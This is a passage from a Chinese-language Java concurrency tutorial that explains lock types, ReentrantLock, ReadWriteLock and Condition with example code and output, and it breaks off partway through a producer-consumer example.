T1 finnish task [1651774206609]
T2 finnish task [1651774206609]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Lock包</h1>
<blockquote>
<blockquote>
<p>java中常见锁分类</p>
</blockquote>
<ul>
<li>
<p>公平锁和非公平锁</p>
<p>根据多线程竞争时是否排队依次获取锁，synchronized和ReentrantLock实现默认都是非公平锁，非公平锁可以提高效率，避免线程唤醒带来的空档期</p>
</li>
<li>
<p>可重入锁和不可重复锁</p>
<p>根据同一个线程是否能重复获取同一把锁</p>
</li>
<li>
<p>共享锁和独占锁(排他锁)</p>
<p>根据多线程是否能共享一把锁，典型的比如ReentrantReadWriteLock，其中读锁是共享锁，写锁是排他锁</p>
</li>
<li>
<p>可中断锁和不可中断锁</p>
<p>根据正在尝试获取锁的线程是否可中断</p>
</li>
<li>
<p>悲观锁和乐观锁</p>
<p>根据线程是否锁住共享资源</p>
</li>
<li>
<p>自旋锁和阻塞锁</p>
<p>根据线程等待的过程</p>
</li>
</ul>
</blockquote>
<h2 id="ReentrantLock">ReentrantLock</h2>
<p>ReentrantLock特点：作用同Synchronized，但是拥有一些独有的特性</p>
<ul>
<li>
<p>可重入：ReentrantLock同步块对同一条线程来说是可重入的，不会出现自己把自己锁死的问题</p>
</li>
<li>
<p>阻塞同步：在成功获取锁的线程执行完之前，会阻塞后面其它线程进入</p>
</li>
<li>
<p><font color="red">等待可中断</font>：持有锁的线程长期不释放锁时，正在等待获取锁的线程可以选择放弃等待，改为处理其它事情，主要是tryLock(time)、lockInterruptibly()方法响应支持</p>
</li>
<li>
<p><font color="red">实现公平锁</font>：通过new ReentrantLock(true)可以实现多线程在等待同一个锁时，严格按照申请锁的顺序来依次获取锁</p>
</li>
<li>
<p><font color="red">锁可以绑定多个条件</font>：一个ReentrantLock对象锁可以同时绑定多个Condition对象</p>
</li>
</ul>
<p>ReentrantLock核心方法解析</p>
<ul>
<li>lock()：尝试获取锁，如果锁已被其它线程获取则等待，lock()方法不能被中断，在死锁情况下会无限等待</li>
<li>tryLock()：尝试获取锁，如果锁已被其它线程获取则放弃，立即返回boolean类型标识位</li>
<li>tryLock(long var1, TimeUnit var3)：尝试获取锁，如果锁已被其它线程持有则等待var1时间，超时再放弃</li>
<li>lockInterruptibly()：相当于把tryLock(long var1, TimeUnit var3)的时间设置成了无限长，但是在等待获取锁的过程中，线程可以被中断</li>
<li>unlock()：释放锁</li>
</ul>
<p>ReentrantLock注意事项</p>
<ul>
<li>ReentrantLock在异常发生时候不会像synchronized锁一样自动释放锁，所以在使用ReentrantLock时候一定要配合try finally使用来进行释放锁（lock.unlock()）</li>
<li><font color="red">tryLock()方法自带插队属性</font>，也就是说即使设置了new ReentrantLock(true)，使用tryLock()方法获取锁仍然是不公平的</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReentrantLockTest</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ReentrantLock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token function">needLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">needLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 不允许打断</span>
        lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" - 取得锁 ："</span> <span class="token operator">+</span> lock<span class="token punctuation">.</span><span class="token function">isHeldByCurrentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" - 释放锁资源："</span> <span class="token operator">+</span> <span class="token operator">!</span>lock<span class="token punctuation">.</span><span class="token function">isLocked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>lock<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// got the lock</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" - 取得锁 ："</span> <span class="token operator">+</span> lock<span class="token punctuation">.</span><span class="token function">isHeldByCurrentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" - 释放锁资源："</span> <span class="token operator">+</span> <span class="token operator">!</span>lock<span class="token punctuation">.</span><span class="token function">isLocked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// do other things</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" - 未取得锁."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">-----------------------------------
Thread-0 finnish task [1652021430165]
Thread-0 - 取得锁 ：true
Thread-0 - 释放锁资源：true
Thread-1 finnish task [1652021432181]
Thread-1 - 取得锁 ：true
Thread-1 - 释放锁资源：true
-----------------------------------
Thread-3 - 未取得锁.
Thread-2 finnish task [1652021443166]
Thread-2 - 取得锁 ：true
Thread-2 - 释放锁资源：true

Process finished with exit code 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ReadWriteLock">ReadWriteLock</h2>
<p>需要解决同时读的排他性</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReentrantReadWriteLockExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ReentrantReadWriteLock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantReadWriteLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ReentrantReadWriteLock<span class="token punctuation">.</span>ReadLock</span> readLock <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ReentrantReadWriteLock<span class="token punctuation">.</span>WriteLock</span> writeLock <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">writeLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// new Thread(ReadWriteLockExample::doWriteAction, "A1").start();</span>
        <span class="token comment">// 同时读，不会排他</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token class-name">ReentrantReadWriteLockExample</span><span class="token operator">::</span><span class="token function">readFiles</span><span class="token punctuation">,</span> <span class="token string">"A1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token class-name">ReentrantReadWriteLockExample</span><span class="token operator">::</span><span class="token function">readFiles</span><span class="token punctuation">,</span> <span class="token string">"A2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">readFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            readLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 开始读操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            readLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 完成读操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">writeFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            writeLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 开始写操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            writeLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" 完成写操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Condition">Condition</h2>
<p>作用：monitor对象的wait、notify</p>
<p>使用：condition.await()/ condition.signal()，需要配合lock使用</p>
<h3 id="当个等待锁队列">当个等待锁队列</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">hots<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>condition</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Condition</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @author: DH
 * @date: 2022/3/5
 * @desc:
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConditionExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">ReentrantLock</span> sourceLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//  condition 是由lock创建</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Condition</span> condition <span class="token operator">=</span> sourceLock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> isUsed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">buildData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">useData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">buildData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            sourceLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// synchronized 关键词 (monitor enter)</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>isUsed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                condition<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　<span class="token comment">// monitor await</span>
            <span class="token punctuation">}</span>

            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
            data<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"P："</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            isUsed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            condition<span class="token punctuation">.</span><span class="token function">signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// monitor notify</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            sourceLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// monitor end</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">useData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            sourceLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>isUsed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                condition<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"C："</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            isUsed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            condition<span class="token punctuation">.</span><span class="token function">signal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            sourceLock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="多个等待锁队列">多个等待锁队列</h3>
<pre class="line-numbers language-none"><code class="language-none">package practice.util.lock.condition;

import practice.common.TaskFactory;

import java.util.LinkedList;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import java.util.stream.IntStream;

/**
 * 多线程生产、多线程消费
 *
 * @author: DH
 * @date: 2022/6/12
 * @desc:
 */
public class ConditionExample3 {

    private static Lock lock = new ReentrantLock();

    private static final Condition PRODUCE_COND = lock.newCondition();

    private static final Condition CONSUMER_COND = lock.newCondition();

    private static final LinkedList&lt;Long&gt; TIMESTAMP_POOL = new LinkedList&lt;&gt;();

    private static final int MAX_SIZE = 100;

    public static void main(String[] args) {
        // 包装多名生产者
        IntStream.rangeClosed(1, 5).boxed().forEach(ConditionExample3::doBuildData);
        // 包装多名消费者
        IntStream.rangeClosed(1, 8).boxed().forEach(ConditionExample3::doConsumeData);
    }

    private static void doBuildData(int index) {
        // 生产者不间断生产数据
        new Thread(() -&gt; {
            while (true) {
                buildData();
                TaskFactory.spend(1, TimeUnit.SECONDS);
            }
        }, "P(" + index + ")").start();
    }

    private static void doConsumeData(int index) {
        // 消费者不间断消费数据
        new Thread(() -&gt; {
            while (true) {
                useData();
                TaskFactory.spend(1, TimeUnit.SECONDS);
            }
        }, "C(" + index + ")").start();
    }

    private static void buildData() {
        try {
